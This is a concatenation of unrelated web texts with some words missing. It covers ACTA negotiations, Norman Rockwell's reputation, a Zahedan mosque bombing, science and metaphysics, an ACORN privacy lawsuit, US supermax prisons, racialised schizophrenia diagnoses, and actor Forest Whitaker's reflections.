One of the problems that we 've noted with the ACTA text is that while it " leaves parties free to implement as they see fit , " it has some pretty severe restrictions on how free they really are to implement things .
So , for example , while it does n't technically mandate three strikes , it makes it clear that a three strikes regime would meet ACTA 's requirements ... and provides no other alternatives .
So you 're free to implement however you want , but the only way you can assure you 're in compliance is to implement it the way they want you to .
To paraphrase Henry Ford , the negotiators are saying : " You can implement it however you want , so long as it's the way we want you to .
" Wow .
The French delegate seems a bit touchy on that topic , huh ?
The question was not claiming that France or the EU was a totalitarian state at all .
Just how do they ensure free expression when the text of the agreement seems to very much go against that by encouraging companies to filter or block certain forms of speech aggressively .
Bizarre that rather than answer the question the delegates responded with such a strange attack on the questioner .
Another cop - out answer .
Rather than admitting how secret and closed off the negotiations have been , the negotiators are just passing the blame , by saying it's not their issue to actually engage representatives from civil rights groups and civil societies .
Besides , the response is again off - base .
If the whole point of meeting with these groups is to understand the concerns of them and their constituents , it should be the negotiators who aresuch meetings .
Once again , this response makes it clear that the negotiators ' marching orders are not to come up with the best solution for each of the societies and countries they represent , but of a very narrow group of special interests .
This is no surprise , but the answer basically confirms that they know this .
Very sad .

If his subjects were purely imaginary , he rendered them with an uncommon amount of descriptive reality , staging scenes in his studio and going to nearly unbelievable lengths to assemble models and props .
He once borrowed , for instance , an actual train seat from the Atchison , Topeka and Santa Fe Railway System and then mailed it back when he was done with it .
He refused to sketch so much as an old wool sock without having the real version in front of him , humbly claiming that he could not draw from his imagination .
His heyday was the 1940s and early ’ 50s , when the accumulated sorrows of the Depression and two World Wars imbued Americans with a sense of solidarity and common purpose .
“ There was a strong sense of loss , ” Mr. Spielberg said .
“ Because not since World War I had America ’s mothers lost so many sons .
It was an open wound , and Rockwell was part of the healing process . ”
As beloved as he was by the public , he suffered the slings of critical derision , especially in the ’50s .
The dominant art movements of that era — Abstract Expressionism , Beat poetry and hard bop jazz — devalued craftsmanship in favor of improvisation and the raw , unmediated gesture .
Against this backdrop Rockwell was accused of purveying an artificial and squeaky - clean view of America , which remains a criticism of him today .

It is true that his work , for the most part , does not acknowledge social hardships or injustice .
It does not offer a sustained meditation on heartbreak or death .
Yet why should it ?
Idealization has been a reputable tradition in art at least since the days when the Greeks put up the Parthenon , and Rockwell ’s work is no more unrealistic than that of countless art - history legends , like Mondrian , whose geometric compositions exemplify an ideal of harmony and calm , or Watteau , who invented the genre of the fête galante .
Rockwell perfected a style of painting that might be called the American Ideal .
Instead of taking place in lush European gardens , his playful gatherings are in a diner on Main Street .
It took the piety - bashing ways of postmodernism to open the gates of Rockwell appreciation in the art world .
Virginia M. Mecklenburg , the curator of the current exhibition at the Smithsonian , said recently that she traces that moment to 1997 , when the art historian Karal Ann Marling published an admiring monograph on Rockwell for the Harry N. Abrams Library of American
Art series .
The book laid the groundwork for a full - scale Rockwell reconsideration that proceeded in short order .
Critics awoke to the draftsmanly prowess of his work , museums like the Solomon R. Guggenheim confidently exhibited , it and prices for his paintings rose exponentially .
The auction record for a Rockwell was set in 2006 , when “ Breaking Home Ties ” — a symbol of empty - nest despair that shows an aging rancher and his son waiting for the train that will take the boy to college — was sold for $ 15.4 million .

The Associated Press has obtained video from Iranian television taken during and just after two suicide bombers attacked a mosque in the southeastern Iranian city of Zahedan on Friday , killing at least 27 people .
Please be warned , it contains some very graphic images :
As my colleagues William Yong and Alan Cowell reported , “ The Sunni Muslim militant group Jundallah claimed responsibility for the attack in a statement on its Web site , saying that two of its ‘ faithful and brave sons ’ had detonated suicide bombs amid a group of Revolutionary Guards . ”
The group ’s statement identified the two bombers as relatives of the former leader of Jundallah , Abdolmalek Rigi , who was executed by Iran in June .
Jundallah has taken responsibility for a string of bombings in Iran , including one last October that killed 15 members of Iran ’s Islamic Revolutionary Guards Corps and 25 civilians .
As Scott Lucas noted on the blog Enduring America , the broadcaster Al Arabiya reported receiving an e-mail message calling the attack revenge for the execution of Mr. Rigi .
The group ’s online statement also said :
This operation is in response to the continuous crimes committed by the Iranian regime in Baluchistan .
These two men sacrificed their souls to humiliate the regime and have proved that our misery will only end with Jihad and by scandalizing the criminals .
The group says it is fighting on behalf of Sunni Muslims from the Baluchi ethnic group , which is found on both sides of the border between Iran and Pakistan .
In February , after the capture of Mr. Rigi , state - run television in Iran showed what it said was a televised confession from him .
In that statement , Mr. Rigi said that he was supported by the United States .
In 2008 , Seymour Hersh reported in The New Yorker that a former C.I.A. official said that the Bush administration had provided support to Jundallah as part of a scheme to undermine Iran ’s government through covert military action .
As The Lede explained in a post on that televised confession , Mr. Rigi claimed in his statement in February that the Obama administration had continued to support his group and even contacted him the same week that the American president released a message of good will to Iranians celebrating the Persian new year , Nowruz .
Since Mr. Rigi ’s televised statement came soon after similar confessions from detained opposition protesters , observers of Iran noted that it was possible that he had been forced to implicate the Obama administration .
Mayor Michael Bloomberg said on Monday that he strongly disagreed with Sarah Palin 's call for New Yorkers to reject a proposed Muslim community center and mosque near Ground Zero— and , for a brief moment , it sounded like he called the former Alaska governor a racist .
But by the end of the news conference , the mayor had made it abundantly clear that he does n't believe the 2008 Republican vice presidential nominee is a racist .

Atom is a word whose origin is paradoxically unscientific .
It 's derived from the Greek atomos meaning " uncuttable " or " indivisible " .
( Also , word fans , it 's the same stem as an extremely useful word , tmesis : the act of inserting an emphasis in the middle of another word , as in " fan-bloody - tastic " ) .
The atom was , for a time , the smallest unit of matter .
And then , my unrelated namesake Ernest Rutherford worked out that it was n't uncuttable , and was made up of distinct smaller parts .
Later still , protons and neutrons , which comprise the mass of atoms , were determined to be composed of quarks , which come in silly names , such as " strange " and " charm " .
These revelations were scientific answers to scientific questions , not the metaphysical assertion of indivisibility .
At this point , you get into the fuzzy boundary between science and maths : the much sought subatomic particle known as the Higgs boson is required to exist for the current theory to work .
Quarks , along with other so called fundamental particles , currently appear to have no substructure , and thus currently fit the description of being indivisible much better than the atom .
The mis-naming of the atom reflected an unscientific view of one of the most basic of scientific questions : " What is stuff made of ? "
There are limits to what the process of observation , experimentation , prediction and falsification can tell us .
Until we invent time - travel and really get a handle on the multiverse , science tells us little about history , for example .
Science may be able to tell us why we like music , why certain types of sound appeal more than others , but not why Bach is the best .
Taking this line in arguments leads to two things .
The first is the view encapsulated by Wittgenstein , that one should only discuss things that one is kitted out to discuss .
Science can only elucidate truths that can be framed in a testable , predictable and falsifiable scenario .
The problem with expressing that view is that detractors look smug , and then reel off a bunch of things that are perfectly answerable in a scientific framework : " But what about love , or consciousness ? "
Well , these are real phenomena , and thus subject to scientific scrutiny .
The answers will no doubt be complex and I expect quite boring .
But they will be answers .
The question " Does God exist ? " is not a metaphysical question and is not outside the boundaries of science .
It should be perfectly testable .
If God has ever interacted with the physical world , then he should be bound by its rules , or the rules are wrong .
The absolute absence of scientific evidence for his existence is good enough for rationalists to conclude that he does not exist .
But if you assert that God is by his nature beyond the natural , is supernatural , then you are simply roadblocking the question .
You are stubbornly framing rationality out of the question , and science has no comment on that .
But it 's a dodge .
There is no reason to think that the question of God 's existence should not be a scientific question .
The second thing that happens in championing the scientific pursuit of truth is that opponents make accusations of " scientism " : that pejorative term levelled at those who claim rational thought as the best way of pursuing truth .
The accusation of scientism is a pain , because mostly it's also employed when the question at stake could perfectly well be answered by science .
Accepting that science does have boundaries as to what truths it is capable of addressing , bears no statement on the scope of those boundaries .
Throughout history , the domain of knowledge amenable to science has only ever changed in one direction : at the expense of all others .
To assume that an atom was indivisible was a metaphysical error , corrected by experimentation .
I am not qualified to comment on the potential fundamental nature of quarks , nor how they fit into the all important standard model in its attempts to describe the behaviour of all matter .
But I am confident that any elucidation of the nature of quarks will come from science not metaphysics .
More specifically , it will come from particle physics experiments such as those at the Large Hadron Collider .
Science may not tell us much about history , or aesthetics , or metaphysics .
But to underestimate the boundaries of what it can say is a fallacy committed only by those who misunderstand or deny the power of the scientific method .
When the comedian Dara O'Briain hears the facile maxim " science does n't know everything " his response is , of course it does n't , otherwise it would stop .
As a way of knowing , there are limits to what science can reveal , but those limits are ever decreasing .
Is there a sensible reason why it can't tell us about love , or psychology , or God or the composition of quarks ?

Complaint leaves room for their employer / pimp , Andrew Breitbart to be added as defendant in the future ...
Brad Friedman Byon 7/12/2010 , 12:42am PT
Rightwing dirty - trickster and convicted federal criminal James O'Keefe and his accomplice Hannah Giles are being sued for invasion of privacy by a San Diego ACORN worker .
Juan Carlos Vera was fired by the 4 - decade old anti-poverty , pro-democracy community organization after deceptively edited and secretly recorded video tapes of a meeting Vera had with O'Keefe and Giles were released by the pair and published on Republican propagandist Andrew Breitbart 's websites .
The tapes were then widely aired on Fox " News " , as well as non-Rightwing media outlets .
Vera is suing for at least $ 75,000 in accordance with California 's Invasion of Privacy
Act which , according to the short , four - page complaint [ PDF ] filed at week 's end in U.S. District Court , " prohibits the recording of confidential communications without the consent of all participants where there is an objectively reasonable expectation that the conversation is not being overheard or recorded . "
In April of this year , CA Attorney General Jerry Brown completed a five - month probe into O'Keefe / Giles / Breitbart 's secretly - taped ACORN videos and found " no criminality " by any of the ACORN workers seen on what he described as " severely edited " tapes .
He did , however , find that O'Keefe and Giles themselves were likely to have violated California law , and could see private litigation brought against them ...
According to the CA Penal Code , as detailed in Vera 's complaint , " any person who intentionally and without consent of all parties to a confidential communication records such conversation is guilty of a crime , punishable by imprisonment in state prison or county jail . "
However , in a deal with O'Keefe and Giles , the AG granted the pair immunity from criminal prosecution under the state 's Invasion of Privacy
Act in exchange for the full , unedited videos which they had previously refused to release .
The AG 's office reviewed them and then released the unedited tapes in full at the conclusion of their investigation .
" The evidence illustrates that things are not always as partisan zealots portray them through highly selective editing of reality , " said Brown in a statement when he released his report .
" Sometimes a fuller truth is found on the cutting room floor . "
As The BRAD BLOG has documented for many months now , the activists edited their tapes to appear as if O'Keefe dressed as and represented himself as a pimp to ACORN workers .
He did neither .
In fact , he represented himself as Giles boyfriend , hoping to save her from an abusive pimp .
Moreover , the highly edited tapes were edited to give the impression that ACORN workers advised the pair on how to break the law .
Here 's just one example of how O'Keefe and Giles misrepresented what had actually occurred in the meetings and on their deceptively cropped tapes .
The blatantly dishonest hoax , however --- amplified and enabled by a wholly uncritical mainstream media --- was brutally effective and destructive , coming as part of the years - long assault by the GOP and the Right against ACORN , largely for having had the temerity to legally register hundreds of thousands of low and middle - income ( read : Democratic - leaning ) voters to legally cast a vote and participate in their own democracy .
Vera 's complaint goes on to note that the eavesdropping and recording provisions of the Penal Code , Section 632 , " defines confidential communication to include " any communication carried on in circumstances as may reasonably indicate that any party to the communication desires it to be confined to the parties thereto . "
" Although the Act contains exemptions for particular individuals or circumstances , " the complaint reads , " no exemption exists for filmmakers , the media , or journalists . "
In his 28 - page report [ PDF ] , the CA AG explained that since O'Keefe and Giles received immunity from prosecution after providing the complete tapes , they " did not determine if they violated California 's Invasion of Privacy
Act when they recorded the ACORN employees .
If the circumstances meet the requirements of the Act , the ACORN employees may be able to bring a private suit against O'Keefe and Giles for recording a confidential conversation without consent . "
Former San Diego ACORN worker Juan Carlos Vera , has now filed such a private suit against O'Keefe and Giles .
In addition to naming O'Keefe and Giles , the suit also specifies unnamed defendants " DOES 1 - 20 inclusive , " allowing for the plaintiff to add additional co-defendants later , as the need arises throughout the discovery phase of the case .
As the secret video tapes made in California were the last among a number of such tapes made by O'Keefe and Giles ( the others on the East Coast ) , and as O'Keefe and Giles ' employer / pimp Andrew Breitbart lives in Los Angeles --- and has lied about the tapes in the past , as seen in both his newspaper column and on video tape --- it seems quite possible that he would have been aware of the video taping in advance of the California meetings , at the very least .
If so , we 'll be neither surprised nor saddened to see Breitbart named as one of those DOES in the not - too - distant future .

This week the European Court of Human Rights temporarily halted the extradition of four terrorism suspects from the United Kingdom to the United States .
The court concluded that the applicants had raised a serious question whether their possible long - term incarceration in a U.S. “ supermax ” prison would violate Article 3 of the European Convention on Human Rights , which prohibits “ torture or … inhuman or degrading treatment or punishment . ”
The court noted that “ complete sensory isolation , coupled with total social isolation , can destroy the personality and constitutes a form of inhuman treatment which cannot be justified by the requirements of security or any other reason , ” and called for additional submissions from the parties before finally deciding the applicants ’ claim .
The court ’s decision was not a surprise .
International human rights bodies have repeatedly expressed the view that supermax prisons — in which prisoners are held in near - total social isolation , sometimes for years on end — may violate international human rights law .
In 2006 , the U.N. Committee Against Torture expressed concern about “ the extremely harsh regime ” in US supermax prisons , which it said could violate the Convention Against Torture and Other Cruel , Inhuman or Degrading Treatment or Punishment , a human rights treaty ratified by the United States in 1994 .
Despite these warnings , supermax prisons are common in the United States .
In the 1990s they were a raging fad , yet another round in the perpetual “ tough on crime ” political bidding war .
Suddenly every state had to build one — Virginia was so tough it built two .
By the end of the decade , more than 30 states , as well as the federal government , were operating a supermax facility or unit .
The devastating effects of isolated confinement on the human psyche have long been well known .
In 1890 , the Supreme Court described the results of solitary confinement as it had been practiced in the early days of the United States :
A considerable number of the prisoners fell , after even a short confinement , into a semi- fatuous condition , from which it was next to impossible to arouse them , and others became violently insane ; others still , committed suicide ; while those who stood the ordeal better were not generally reformed , and in most cases did not recover sufficient mental activity to be of any subsequent service to the community .
Conditions in modern supermax prisons are , if anything , even more damaging , as technological advances like video surveillance have made possible a greater degree of social isolation than in earlier times .
The ACLU has been bringing challenges to supermax prisons for over a decade , and what we ’ve found is troubling .
The official line is that these prisons are reserved for the “ worst of the worst ” — the most dangerous and incorrigibly violent — but most states have only a few such prisoners .
In overcrowded prison systems , the typical response has been to fill the remaining supermax cells with " nuisance prisoners " — those who file lawsuits , violate minor prison rules , or otherwise annoy staff , but by no stretch of the imagination require the extremely high security of a supermax facility .
Thus in Wisconsin 's supermax , one of the " worst of the worst " was a 16 - year - old car thief .
Twenty - year - old David Tracy hanged himself in a Virginia supermax ; he had been sent there at age 19 , with a 2 ½ year sentence for selling drugs .
The mentally ill are vastly overrepresented in supermax prisons , and once subjected to the stress of isolated confinement , many of them deteriorate dramatically .
Some engage in bizarre and extreme acts of self - injury and even suicide .
In an Indiana supermax , a 21 - year - old mentally ill prisoner set himself on fire in his cell and died from his burns ; another man in the same unit choked himself to death with a washcloth .
It ’s not unusual to find supermax prisoners who swallow razors and other objects , smash their heads into the wall , compulsively cut their flesh , try to hang themselves , and otherwise attempt to harm or kill themselves .
Lawsuits by the ACLU and others have mitigated some of the worst features of supermax confinement , but thousands of prisoners remain entombed in these facilities throughout the United States .
Fortunately , with states facing record budget deficits , supermax facilities , which are far more expensive to build and operate than conventional prisons , have lost much of their appeal .
Bills have been introduced in the Illinois and Maine legislatures to substantially restrict supermax confinement in those states .
There ’s a long way to go , but these are important first steps toward bringing U.S. prison conditions into line with human rights norms , and with basic human decency .

First , some preliminaries about your fascinating book , The Protest Psychosis : How Schizophrenia Became a Black Disease ( Beacon , 2010 ) .
How did you come to unearth such a trove of important documents at Ionia State Hospital in northeastern Michigan ?
Ionia State Hospital for the Criminally Insane was , for much of the 20th century , one of the nation 's more notorious mental asylums , occupying an incredible 529 acres , and its annual census hovered above 2,000 patients .
But , like many American asylums , Ionia suffered a rapid fall from grace in the late 1960s and early 70s , during the so - called era of deinstitutionalization .
By 1974 , the census was a paltry 300 , and in 1975 the facility closed , then quickly reopened — as a prison .
That rapid transformation fascinated me .
What had happened to the patients ?
What had changed ?
Why did the hospital become a prison ?
I spent a long time searching for the records , and ultimately discovered that much of the hospital 's institutional — nearly a century of patient charts , reports , photographs , ledgers , and other artifacts — had been placed randomly in storage in the State Archive of Michigan , in Lansing .
I spent another year gaining clearance from various review boards since of course the archive contains highly personal and confidential information , then spent the next four years reviewing the charts of over 800 patients .
What I found troubled me greatly .
As I write in the book , " The charts documented in minute detail the tragedy of what it meant to be warehoused in a state asylum at mid-century — and , in particular , in an asylum where short court sentences devolved into lifelong incarceration .
A number of charts contained yearly notes from patients to their doctors voicing such sentiments as Doc , I really think I am cured or Dear Doctor , I believe I am ready to go home , or , You have no right to keep me here .
These letters stacked thirty - deep in some charts , signifying years of pleading and longing and anger , together with thirty years of responses from clinicians urging , You are almost there , or : Perhaps next year .
Invariably , the last note in each stack was a death certificate from the Ionia coroner . "
When did you first suspect that diagnostic patterns with had become heavily racialized ?
I found dramatic racial and shifts in persons diagnosed with schizophrenia at Ionia during the 1960s — so much so that schizophrenia 's racial and gendered transformation became the central narrative of my book .
This shift became apparent very early in my research .
Before the 60s , Ionia doctors viewed schizophrenia as an illness that afflicted nonviolent , white , petty criminals , including the hospital 's considerable population of women from rural Michigan .
Charts emphasized the negative impact of " schizophrenogenic styles " on these women 's abilities to perform their duties as mothers and wives .
To say the least , these patients were not seen as threatening .
This patient was n't able to take care of her family as she should , read one chart ; another , This patient is not well adjusted and can't do her housework ; and another , She got confused and talked too loudly and embarrassed her husband .
By the mid- to late - 1960s , however , schizophrenia was a diagnosis disproportionately applied to the hospital 's growing population of African American men from urban Detroit .
Perhaps the most shocking evidence I uncovered was that hospital charts " diagnosed " these men in part because of their symptoms , but also because of their connections to the civil rights movement .
Many of the men were sent to Ionia after convictions for crimes that ranged from armed robbery to participation in civil - rights protests , to property destruction during periods of civil unrest , such as the Detroit riots of 1968 .
Charts how and delusions rendered these men as threats not only to other patients , but also to clinicians , ward attendants , and to society itself .
You 'd see comments like Paranoid against his doctors and the police .
Or , Would be a danger to society were he not in an institution .
Did the second edition of the DSM , released in 1968 , have a significant influence on that shift in emphasis ?
One of the key pieces of evidence I use to help explain the shifts seen at Ionia is through an extensive analysis of the changing language associated with the official definition of schizophrenia .
Before the 60s , psychiatry often posited that schizophrenia was a psychological " reaction " to a splitting of the basic functions of .
Official descriptors emphasized the generally calm nature of such persons , in ways that encouraged associations with middle - class housewives .
But the frame changed in the 60s .
In 1968 , in the midst of a political climate marked by profound protest and social unrest , psychiatry published the second edition of the .
That text recast the paranoid subtype of schizophrenia as a disorder of masculinized belligerence .
" The patient 's attitude is frequently hostile and aggressive , " DSM - II claimed , " and his behavior tends to be consistent with his delusions . "
I have a lot of data in my book that shows how this language — particularly terms such as " hostility " and " " — was used to justify schizophrenia diagnoses in black men at Ionia in the 1960s and 1970s .
How would you explain that shift , and would you view American psychiatry in those years as exhibiting either manifest or ?
Was it just coincidence that the DSM - II language enabled the diagnosis of schizophrenia among increasing numbers of African Americans ?
That 's a very important question .
I argue extensively in my book that the purpose of my analysis is not to lay blame for individual racism , because I feel that such blame - games oversimplify what was going on .
Many of the doctors at Ionia genuinely wanted to help their patients .
I also talk to psychiatrists who worked on the DSM - II who told me that they were trying to do the best they could to produce scientific , objective diagnostic criteria .
At the same time , my evidence shows how even the most scientific diagnostic criteria can reflect the social environments in which they are produced , a process I discuss through the language of structural or institutional violence .
This was certainly the case for the DSM - II .
As I show , the manual 's emphasis on hostility and aggression reflected a much wider set of national conversations and anxieties about civil rights .
The shifting frame surrounding schizophrenia had dire consequences for African American men held at the Ionia State Hospital during the civil - rights era .
More broadly , my evidence also shows that growing numbers of research articles in professional journals used this language to cast schizophrenia as a disorder of racialized aggression .
In the worst cases , psychiatric authors conflated the schizophrenic symptoms of African American patients with the perceived schizophrenia of civil rights protests , particularly those organized by Black Power , the Black Panthers , the Nation of Islam , or other activist groups .
Ultimately , new psychiatric definitions of schizophrenic illness in the 60s impacted persons of many different racial and ethnic backgrounds .
Some patients became schizophrenic because of changes in diagnostic criteria rather than in their clinical symptoms .
Others saw their diagnoses changed to , , or other conditions because they did not manifest hostility or aggression .
How did the psychiatric profession characterize schizophrenia before the first and second editions of the DSM ?
Insanity has a long and fascinating history .
Before the advent of what we call " modern psychiatry , " conventional had it that specific actions and life events caused specific types of insanity .
Paupers Lunacy was thought to result from habitual intemperance , poverty , and destitution , treated by a of wholesome digestible bread and milk porridge , along with occasional topical bleedings .
Masturbatory Insanity came from onanistic self - corruption and led to a form of idiocy manifest by sallow skin , lusterless eyes , flabby muscles , loose stools , and , of course , cold and clammy hands .
And Old Maid 's Insanity was , as the name implied , the insanity of old maids .
Two key figures helped to change the course of how we think about insanity .
Emil Kraepelin was foremost among a group of European clinicians who defined insanity not according to causes or symptoms , but according to course and prognosis .
In 1899 , he coined the term praecox to describe the " development of a peculiar simple condition of mental weakness occurring at a youthful age . "
And in 1911 , Swiss psychiatrist Paul Eugen Bleuler argued that the underlying mechanism in praecox was a " loosening of associations , " a process in which patients existed in the real world and at the same time turned away from reality ( " " ) into the world of , wishes , fears , and symbols .
As an early proponent of Freudianism , Bleuler placed on a spectrum with as a developmental disorder with origins .
He maintained that the term dementia praecox should be replaced by a name that combined the Greek words for split ( schizo ) and mind ( phrene ) .
" I call dementia praecox ‘ schizophrenia , ' " he wrote , " because the ‘ splitting ' of the different psychic functions is one of its most important characteristics . "
You make a powerful case for the way schizophrenia was transformed into a racialized disease at Michigan 's Ionia State Hospital .
To what extent can one extrapolate from that large psychiatric hospital broader trends across the country ?
As a cultural historian and psychiatrist , I 'm able to show how trends at Ionia reflect a series of larger cultural trends .
One key literature that emerges in the 60s concerns the persistent race - based overdiagnosis of schizophrenia in African American men .
For instance , in the '60s , National Institute of Mental Health studies found that " blacks have a 65 % higher rate of schizophrenia than whites . "
In 1973 , a series of studies in the Archives of General Psychiatry discovered that African - American patients were " significantly more likely " than white patients to receive diagnoses of schizophrenia , and " significantly less likely " than white patients to receive diagnoses for other mental illnesses such as depression or .
Throughout the 1980s and 90s , a host of articles from leading psychiatric and medical journals showed that doctors diagnosed the paranoid subtype of schizophrenia in African - American men five to seven times more often than in white men , and also more frequently than in other groups .
I also document in the book how associations between insanity and the civil rights movement played out extensively in American popular culture , and helped to shape the emergence of a much wider set of stigmatizations of schizophrenia — that it was an unduly hostile or violent disorder .
I look closely at changing twentieth - century American assumptions about the race and temperament of schizophrenia through sources including American medical journals , newspapers , popular magazines , historically Black newspapers , studies of popular opinion , music lyrics , films , and civil - rights memoirs .
I also reproduce unbelievable pharmaceutical advertisements that show angry black men protesting in the streets as ways of selling antipsychotic drugs .
I do n't know if you 're following DSM - 5 developments closely , but there 's been an enormous amount of controversy over " psychosis risk syndrome , " which is being proposed for inclusion in 2013 as a way of improving the " early detection " of psychosis , especially in teens and children .
Given the history you 've unearthed about schizophrenia , are you confident that " psychosis risk " will function largely as the APA intends , or are there likely to be unintended consequences if it 's included in DSM -5 ?
Yes , I 'm following this very closely .
On one hand , I have to say that there is something very admirable about a profession that is willing to throw its entire diagnostic system up for grabs every 15 years or so , and to seriously consider each and every word of its diagnostic bible .
I also think that psychiatry has made great strides toward understanding the causes of mental disease , so in this sense the revision of the DSM represents progress on many fronts .
Yet history teaches us to be wary of language that might broaden diagnostic categories ( or , in this case , might pathologize risk in addition to illness ) , especially when that broadening is not supported by clear - cut scientific facts .
Also , it goes without saying that the language that appears in the DSM has tremendous implications for the lives of a great many people , patients and doctors both .
Even in an era dominated by , diagnosis remains a projective act — one that combines scientific understanding with a complex set of ideological assumptions .
You 're a psychiatrist , and one who 's critical of your profession 's history , as is clear from both this book and your earlier one , Prozac on the Couch ( Duke , 2003 ) .
How do you personally negotiate such professional tensions , and what in your opinion would help to narrow and alleviate them for other psychiatrists concerned about the state of their discipline ?
Let me say , first , that in no way is my work meant to suggest that mental illness is socially fabricated , or , worse , that people 's suffering is somehow inauthentic .
As a psychiatrist , I have seen the tragic ways in which hallucinations , delusions , social withdrawal , , and profound isolation rupture lives , careers , families , and in profoundly material ways .
I know that such symptoms afflict persons of many different social , economic , and racial backgrounds , most all of whom are deeply aware of the sense of loss that their disease represents , even if society is less attuned .
I also strongly believe that persons diagnosed with schizophrenia and other mental illnesses benefit from various forms of treatment or social support , and that our society should invest more in the care and well - being of the severely mentally ill .
I also believe that vigorous debate is good for psychiatry — both from outside the profession , and from within it .
In previous eras , critics adopted a so - called antipsychiatric stance that advocated the near - overthrow of the profession .
And to be sure , important critics still advocate for massive change .
We know all too well from plagues past that the rhetoric of mental health and mental illness can become effective ways of policing the boundaries of civil society , and of keeping undesirable persons always outside .
But today you also see increasing numbers of scholars like myself who believe in the therapeutic and even potentially liberatory promise of the profession , while remaining deeply concerned about such issues as the impact of the pharmaceutical industry , the stigma surrounding diagnosis , and the expanded use of psychotropic medications , to name but a few .
I would like to think that books like mine help us understand how tensions that seem timeless or eternal — whether related to mental illness stigma , the overuse of psychotropic drugs , racial stereotypes surrounding psychiatric diagnosis , or even mistrust of psychiatry by members of minority communities — in fact result from particular decisions made at specific moments in time .
I write in the book , " only during the civil - rights era did emerging scientific understandings of schizophrenia become enmeshed in a set of historical currents that marked particular bodies , and particular psyches , as crazy in particular ways .
The tensions of that era then changed the associations that many Americans made about persons with schizophrenia .
Ultimately , recent American racial history altered more than the meaning of mental illness : it changed the meaning of mental health as well . "

But I 'll still look inside him to find a point of connection .
If I can find that kernel , audiences will relate to me .

But his goal is to get Vic Mackey off the street .
This is somebody who beats people up on a weekly basis , steals money , blackmails people .
But I 'm the bad guy ?
My parents moved to Los Angeles when I was really young , but I spent every summer with my grandparents , and I 'd stay with my grandfather on the farm in Longview { Texas ] .
He was retired from the railroad , and he had a small farm with some cows and some pigs .
I remember part of my youth was feeding hogs and plowing fields and stuff , so that 's a part of me .
And my parents raised me to say " sir " and " ma'am " ' to open doors , things like that .
That 's the way I was brought up .
Also , unfortunately , I was taught not to question too much .
I did n't really question my mom and dad .
That 's usually what they told me to do .
[ on being a black actor ] I have friends , African - American actors , who 've had more of a struggle ; hopefully they 're starting to see some air and light now .
But in my directing career , in my acting career , in my producing career , I have n't been bound by a lot of limitations .
When I first started doing these kinds of unique characters , these diverse characters , there was hardly anybody doing them .
So I had this open road .
[ on his children 's names - True and Ocean - and his name and how it affected his childhood ]
I want those names to be their destiny , for my daughter to be honest and my son to be expansive .
I try to be like a forest , revitalizing and constantly growing . . . .
Kids would tease me , calling me Little Bush " .
But . . .
I thought being called Forest helped me find my identity .
[ in 1998 ]
As a kid , I never had dreams of becoming an actor or director .
Even when I was already working professionally , it took me a long time to know whether this was what I really wanted to be .
Now I feel comfortable about what I 'm doing , but I see that I can continue to make it better , that I can create a deeper balance in my life , and I 'm still working on that .
I did n't plan for things to turn out this way at all .
But I have to say , I feel good about it .
I do .
[ on the most interesting actor he has worked with ] Mickey Rourke , I thought , was really interesting .
I did a movie called Johnny Handsome - Der schöne Johnny ( 1989 ) that Walter Hill directed .
I had a scene with Mickey in which he says goodbye to me , and I learned something very powerful .
He did n't say anything .
I do n't know if his thoughts were so powerful or my imagination was so large , but I could swear I could hear him speaking to me .
It was like he was saying , " I want to tell you thanks - - you know , I 'm about to disappoint you , but you did a good job " .
And then , finally , he says , " Thank you " .
I was just like , " Whoa ! "
He 's an amazing actor .
[ on his career ]
As an actor , I 've always wanted to do characters that would help me find my connection with others and connect all of us together .
You always want the energy of the character , the spirit of the person , to enter you .
I 've been doing this for 26 years and some of the things I 've done are always with me .
Maybe it's a word ; maybe it's a gesture ; maybe the sound ; maybe it's a new understanding about something .
I look at it like a past life because I keep going over and over what I have done .
[ on choosing studio or independent films ]
I go back and forth between indie and studio because I feel like it , not because I feel obligated to do one or the other .
The only reason to make a decision like that is financial , you know , you can't live .
That does n't make my decision for me , I do what feels right for me .
I 'm not going to do a bad movie just because it's a studio movie or an indie film , and there are hordes of bad independent movies .
People tend to think that indie movies are always good , but I 've seen horrific ones , just as well as I 've seen horrific studio films .
So I just go by how I feel , it 's the only way you can figure it out .
Otherwise you get lost in the maze of trying to second guess the people , the studio , how you can make your career long or short .
It 's easy to get lost in this maze , called life , really , you know what I mean ?
[ on filming the Panic Room ( 2002 ) ]
The guys on the set , Dwight [ Dwight Yoakam ] , Jared [ Jared Leto ] and me , would work for a day , and then the next day Jodie [ Jodie Foster ] would work .
We rarely worked together , so it was all about getting to know some of the guys .
With the way scheduling was , she 's not in the small frame as all of us .
They never did it that way .
The thing about the film was you did become closer with some people in ways because it took so long .
This is the longest shoot I have ever had .
It was about 145 shooting days .
We also had rehearsals before that .
I think it took so long because of the shots taken .
It was the most planned movie I 've been involved with .
[ on his role in Der letzte König von Schottland - In den Fängen der Macht ( 2006 ) ]
It was an experience that changed my life and my thoughts .
I went there with the purpose of understanding what it was like to be Ugandan , and I wanted to understand the food , the life , the way they deal with children and wives and with authority figures .
I sat with Idi Amin 's brother underneath a big mango tree and he told me stories about what Idi was like and how he used to come to town and pull together soccer or rugby games .
It all helped me with figuring out the way he behaved and the way he thought , so that 24 hours a day , even in my dreams , I was totally consumed by the character of Idi Amin .
It was n't until the movie was over that I decided I could let go of the character , so the first thing I did was take a shower because I figured I could wash him off by scrubbing myself .
I was in a room by myself , so I started yelling to get his voice out of me and get my own voice back .
[ on getting into acting ]
In high school I did some musicals , but I never took acting until college .
I was studying opera , classical voice , and a speech teacher asked me to audition for this play and I got the lead .
And she helped me to get into a conservatory , with a scholarship as a singer , and then I was accepted into the acting conservatory .
This agent saw me , the summer before I went to conservatory , and while I was in school , I started working right away .
And it worked out .
[ on his role in Ghost Dog - Der Weg des Samurai ( 1999 ) and how he prepared ]
I started reading " The Hagekure " and other books , including one called " The Code of the Samurai " , and I watched a lot of films .
I tried to find his mindset more than anything .
It 's more like a trance - like state for this character than it is anything else , based in the ancient book that he follows .
But I did a lot of different types of research .
Until film is just as easily accessible as a pen or pencil , then it 's not completely an art form .
In painting you can just pick up a piece of chalk , a stick or whatever .
In sculpture you can get a rock .
Writing you just need a pencil and paper .
Film has been a very elitist medium .
It costs so much money .
It does n't allow everyone who wants to tell stories tell stories .
The great storytellers , however , are going to rise to the top , no matter what .
That 's why independent film is very important to me .
My eye ?
It 's a genetic thing .
My dad had it and now I have it .
You know , I just found out that it may be correctable a little bit , because it does impair my vision .
When I look up , I lose sight in this eye .
I think maybe for other people , it informs the way they see me .
But I do n't really think about this eye , other than the times people talk about it , or when people take photographs of me sometimes they might say stuff about it .
I do n't think it makes me look bad or anything .
It just is .
